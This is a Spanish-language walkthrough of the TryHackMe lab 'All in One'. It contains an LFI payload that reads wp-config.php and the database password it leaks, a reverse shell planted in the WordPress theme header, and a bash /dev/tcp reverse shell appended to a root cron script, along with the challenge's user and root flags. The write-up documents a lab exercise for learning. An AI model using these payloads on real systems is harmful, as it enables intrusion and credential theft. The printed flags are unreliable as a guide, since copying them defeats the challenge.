# All in One - TryHackMe

- Objetivo: Obtener acceso al sistema y escalar privilegios hasta root.
- Fecha: 12/06/2025
- Autor del reto: Liiaam251
- Enlace a la máquina: [https://tryhackme.com/room/allinonemj](https://tryhackme.com/room/allinonemj)
- IP de la máquina: 10.10.135.37

## Enumeración de puertos con Nmap

Comando utilizado:
````bash
$ nmap -p- --open -sS -sV -sC -T4 -n -Pn 10.10.23.108
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-12 15:10 EDT
Nmap scan report for 10.10.23.108
Host is up (0.051s latency).
Not shown: 65493 closed tcp ports (reset), 39 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.3.53
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 80:9a:4f:d8:20:12:24:89:10:12:a5:15:e4:45:03:ff (RSA)
|   256 20:69:78:bf:b7:df:92:75:6b:a1:5d:d5:1f:07:79:ec (ECDSA)
|_  256 d7:dd:70:7b:5c:f9:de:25:3b:83:d7:f4:9c:4d:f2:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
````
## Enumeración de subdominios

He usado este comando con el que he contrado /worpress
````bash
gobuster dir -u http://10.10.23.108 -w /home/kali/Downloads/subdomains-top1mil-20000.txt -x html,php,txt -t 50
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.23.108/wordpress/]
/index.html           (Status: 200) [Size: 10918]
Progress: 80000 / 80004 (100.00%)
===============================================================
Finished
````
Tenemos un wordpress así que lanzamos un wpscan:

````
sudo wpscan --url http://10.10.23.108/wordpress --passwords /home/kali/rockyou.txt

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.23.108/wordpress/ [10.10.23.108]
[+] Started: Thu Jun 12 15:15:19 2025
[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.23.108/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://10.10.23.108/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] mail-masta
 | Location: http://10.10.23.108/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.23.108/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.23.108/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 1 user/s
eTrying elyana / jeremy Time: 00:00:24 <                                                                                                                                                             > (205 / 14344391)  0.00%  ETA: ??:??:?^Cying elyana / 1515151515 Time: 00:40:22 <                                                                                                                                                       > (71844 / 14344391)  0.50%  ETA: ??:??:??
````
Encontramos un password y un user, lo vamos a meter dentro del login, pero no es correcta la contraseña.

Después de estar un rato buscando me fijo en los plugins que hay, mail-masta es vulnerable a LFI, entonces vamos a buscar si esto es verdad

He encontrado este exploit en Exploit Database: [https://www.exploit-db.com/exploits/50226](https://www.exploit-db.com/exploits/50226)

````
http://10.10.23.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
````
En efecto es vulnerable, ahora lo que nos interesaría sería buscar el wp-config.php para ver contraseñas.
Despues de estar unos 20 minutos buscando ya que no me aparecía añadiendo ../../../../../wp-config.php he visto en las LFI el uso de php://filter es común si el contenido no sale directamente y esto lo he juntado con Uso de convert.base64-encode:

Al aplicar este filtro, el contenido del archivo se codifica en base64, lo que permite:

Evitar que el servidor lo interprete como PHP (previniendo errores).

Leer el contenido sin problemas de caracteres especiales.

comando usado finalmente:
````
http://10.10.23.108/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
````

Después de pasarlo por ciberchef y descodificarlo me ha dado:
````
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

wordpress;
define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'zkY%m%RFYb:u,/lq-iZ~8fjENdIaSb=^k<3Zr/0DiLZqPxz|Auqli6lZ-9DRagJP' );
define( 'SECURE_AUTH_KEY',  'iAYak<_&~v9o+{b@RPR62R9 Ty- 6U-yH5baUD{;ndSiC[]qosxS@scu&S)d$H[T' );
define( 'LOGGED_IN_KEY',    'aPd_*sBf=Zuc++a]5Vg9=P~u03Q,zvp[eUe/})D=:NyhUY{KXR]t7}42Upk[r7?s' );
define( 'NONCE_KEY',        '@i;T({xV/fvE!s+^de7e4LX3}NT@ j;b4[z3_fFJbbW(no 3O7F@sx0!oy(O`h#M' );
define( 'AUTH_SALT',        'B AT@i
````
Tenemos una contraseña diferente ya, vamos a entrar al login exitosamente

## Reverse Shell

Dentro del editor del gestor de contenido en la parte de header he añadido una reverse shell en php de pentesmonkey: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) y he cambiado a mi ip (tun0)
seguidamente me he puesto por escuha con netcat

````bash
nc -lvnp 1234
````
````bash
nc -lvnp 1234                   
listening on [any] 1234 ...
connect to [10.9.3.53] from (UNKNOWN) [10.10.23.108] 48990
Linux ip-10-10-23-108 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 20:37:17 up  1:27,  0 users,  load average: 0.00, 0.01, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-10-23-108:/$ 
````
## Escalada de privilegios - Crontab

Despues de hacer busqueda de SUID de Capabilities he dado con abrir /etc/crontab nos salee esto:
````bash
www-data@ip-10-10-23-108:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /var/backups/script.sh
````
vamos a ver los permisos que tiene

````bash
www-data@ip-10-10-23-108:/$ ls -la /var/backups/script.sh
````
tiene todos los permisos solo queda remplazar lo que hay dentro por nuestra shell yo he usado este coamndo:

````bash
echo "bash -i >& /dev/tcp/10.9.3.53/4444 0>&1" >> /var/backups/script.sh
````
En mi local host he usado netcat
````bash
$ nc -lvnp 4444                   
listening on [any] 4444 ...
connect to [10.9.3.53] from (UNKNOWN) [10.10.23.108] 36836
bash: cannot set terminal process group (4155): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-23-108:~# whoami
whoami
root
````
## Task 1 Hack the machine !

1. user.txt
dentro de la carpeta de el yana está ahí, estan en base64 hay que descodoficarlo, yo he usado ciberchef pero podeis usar el propio decode de linux

cd /elyana
cat user.txt
pasar por ciberchef:

````
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
````

2. root.txt
dentro de la carpeta /root

cd /root
cat root.txt
pasar por ciberchef
````
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
````

No ha sido neecsario el uso del SSH pero juraría que con las credenciales del worpress se podía acceder a este.









